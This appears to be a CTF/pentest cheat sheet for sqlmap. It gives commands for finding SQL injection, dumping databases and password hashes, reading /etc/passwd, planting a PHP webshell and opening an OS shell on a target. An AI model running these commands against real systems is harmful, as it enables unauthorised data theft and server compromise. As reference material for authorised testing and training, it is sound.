## Automated SQL Injection

sqlmap is an open-source tool that automates detection and exploitation of SQL injection vulnerabilities. It can enumerate databases, dump tables, read/write files on the server, and even get an OS shell — all from a vulnerable parameter.

---
## Installation
### Linux (Debian/Ubuntu)

```bash
sudo apt update && sudo apt install sqlmap
```
### macOS

```bash
brew install sqlmap
```
---
## Basic Syntax
```bash
sqlmap -u "<url>" [options]
```

---
## Finding the Injection Point

### GET Parameter
```bash
sqlmap -u "http://$IP/item.php?id=1"
```

- Tests the `id` parameter for SQL injection
- **Use case**: URL with parameters (most common CTF scenario)

### POST Form
```bash
sqlmap -u "http://$IP/login.php" --data="username=admin&password=test"
```

- `--data`: POST body; sqlmap tests each field
- **Use case**: Login forms, search fields

### From Burp Request File
```bash
sqlmap -r request.txt
```

- Save raw HTTP request from Burp: right-click → Save item
- **Use case**: Complex requests with tokens, headers, or encoded bodies

### Authenticated (Cookie)
```bash
sqlmap -u "http://$IP/page.php?id=1" --cookie="PHPSESSID=abc123"
```

- `--cookie`: Include session cookie to reach authenticated pages
- **Use case**: Injection points behind a login wall

---
## Enumeration

### Get Current Database
```bash
sqlmap -u "http://$IP/item.php?id=1" --current-db
```

### List All Databases
```bash
sqlmap -u "http://$IP/item.php?id=1" --dbs
```

### List Tables in a Database
```bash
sqlmap -u "http://$IP/item.php?id=1" -D <dbname> --tables
```

### List Columns in a Table
```bash
sqlmap -u "http://$IP/item.php?id=1" -D <dbname> -T <tablename> --columns
```

### Dump a Table
```bash
sqlmap -u "http://$IP/item.php?id=1" -D <dbname> -T <tablename> --dump
```

### Dump Specific Columns
```bash
sqlmap -u "http://$IP/item.php?id=1" -D <dbname> -T users -C username,password --dump
```

---
## Common Options Reference

### Target & Request

| Option | Description |
| ------ | ----------- |
| `-u <url>` | Target URL |
| `--data <data>` | POST body string |
| `-r <file>` | Load request from file (Burp export) |
| `--cookie <str>` | HTTP cookie header |
| `-H "Header: val"` | Add custom header |
| `--proxy http://127.0.0.1:8080` | Route through Burp proxy |
| `--method <method>` | Override HTTP method (GET/POST/PUT) |

### Detection

| Option | Description |
| ------ | ----------- |
| `-p <param>` | Test only this parameter |
| `--dbms <type>` | Skip detection; force DBMS (mysql, mssql, sqlite, oracle) |
| `--level <1-5>` | Test breadth (default: 1; level 2 tests cookies) |
| `--risk <1-3>` | Risk tolerance (default: 1; 3 adds heavy queries) |
| `--technique <BEUSTQ>` | Limit to specific injection techniques |

### Enumeration

| Option | Description |
| ------ | ----------- |
| `--dbs` | List all databases |
| `--tables` | List tables (use with `-D`) |
| `--columns` | List columns (use with `-D -T`) |
| `--dump` | Dump table data |
| `--dump-all` | Dump everything (slow) |
| `-D <db>` | Target database |
| `-T <table>` | Target table |
| `-C <cols>` | Target columns (comma-separated) |
| `--current-db` | Get current database |
| `--current-user` | Get current DB user |
| `--passwords` | Dump user password hashes |
| `--users` | List database users |

### Output & Misc

| Option | Description |
| ------ | ----------- |
| `--batch` | Never prompt; use defaults automatically |
| `--threads <n>` | Concurrent HTTP threads (default: 1) |
| `-v <0-6>` | Verbosity (default: 1; 6 = full debug) |
| `--output-dir <dir>` | Custom output directory |
| `--fresh-queries` | Ignore cached results from prior runs |
| `--forms` | Auto-detect and test forms on the page |

---
## Injection Techniques

| Code | Technique |
| ---- | --------- |
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | Union query |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

```bash
# Union + error only (fastest when visible output)
sqlmap -u "http://$IP/page.php?id=1" --technique=UE

# Time-based only (when no visible output)
sqlmap -u "http://$IP/page.php?id=1" --technique=T
```

---
## Advanced: File & Shell Access

### Read File from Server
```bash
sqlmap -u "http://$IP/page.php?id=1" --file-read="/etc/passwd"
```

- Requires `FILE` privilege on DB user

### Write File to Server (Webshell)
```bash
sqlmap -u "http://$IP/page.php?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

- Requires write access to the webroot
- **Use case**: Get RCE via uploaded webshell

### OS Shell
```bash
sqlmap -u "http://$IP/page.php?id=1" --os-shell
```

- Interactive command execution on the server
- Only works with high DB privileges and writable webroot

### SQL Shell
```bash
sqlmap -u "http://$IP/page.php?id=1" --sql-shell
```

- Interactive SQL query prompt against the target DB

---
## Practical Examples

### Full Enumeration Chain
```bash
# Step 1: Confirm injection and get current DB
sqlmap -u "http://$IP/page.php?id=1" --current-db --batch

# Step 2: List tables in that DB
sqlmap -u "http://$IP/page.php?id=1" -D webapp --tables --batch

# Step 3: Dump the users table
sqlmap -u "http://$IP/page.php?id=1" -D webapp -T users --dump --batch
```

### POST Login Form
```bash
sqlmap -u "http://$IP/login.php" \
  --data="username=admin&password=test" \
  --dbs --batch
```

### From Burp Request (Best for Complex Forms)
```bash
sqlmap -r request.txt --dbs --batch
```

### Authenticated with Cookie
```bash
sqlmap -u "http://$IP/dashboard?id=1" \
  --cookie="session=eyJhbGci..." \
  -D app -T users --dump --batch
```

### Aggressive Scan
```bash
sqlmap -u "http://$IP/page.php?id=1" --level=5 --risk=3 --dbs --batch
```

---
## Output Interpretation

```
[INFO] GET parameter 'id' is vulnerable
Parameter: id (GET)
    Type: UNION query
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL-- -
[INFO] the back-end DBMS is MySQL
```

| Field | Meaning |
| ----- | ------- |
| `is vulnerable` | Confirmed injectable parameter |
| `Type` | Injection technique that succeeded |
| `Payload` | Exact SQLi string used |
| `back-end DBMS` | Database engine detected |

---
## Tips & Best Practices

1. **Always use `--batch`** — avoids interactive prompts stopping the scan
2. **Start with `--current-db`** to confirm injection before dumping everything
3. **Use `-r request.txt`** for POST forms — saves encoding headaches
4. **Set `--dbms=mysql`** if you already know the backend — skips detection and speeds up
5. **`--level 2` reaches cookies** — default level 1 skips cookie parameters
6. **Don't dump everything** — go `-D db -T table` instead of `--dump-all` on large DBs
7. **Crack dumped hashes offline** with [Hashcat](./Hashcat.md) or [John](./John.md)
8. **`--technique=U` is fastest** when there's visible output; use `T` for blind injection

---
## Quick Reference

```bash
# Test a GET parameter
sqlmap -u "http://$IP/page.php?id=1" --batch

# List databases
sqlmap -u "http://$IP/page.php?id=1" --dbs --batch

# Dump users table
sqlmap -u "http://$IP/page.php?id=1" -D app -T users --dump --batch

# POST form
sqlmap -u "http://$IP/login.php" --data="user=admin&pass=test" --dbs --batch

# From Burp
sqlmap -r request.txt --dbs --batch

# Authenticated
sqlmap -u "http://$IP/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs --batch

# Read file
sqlmap -u "http://$IP/page.php?id=1" --file-read="/etc/passwd" --batch

# OS shell
sqlmap -u "http://$IP/page.php?id=1" --os-shell --batch
```

---
## Related Tools

- **[ffuf](./ffuf.md)** - Discover injectable endpoints and parameters first
- **[Nmap](./Nmap.md)** - Find web services and DB ports
- **[Hashcat](./Hashcat.md)** / **[John](./John.md)** - Crack dumped password hashes
- **Burp Suite** - Intercept requests to feed into `-r`; manual SQLi testing

---
## Resources

- [sqlmap Official Site](https://sqlmap.org/)
- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [sqlmap Usage Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
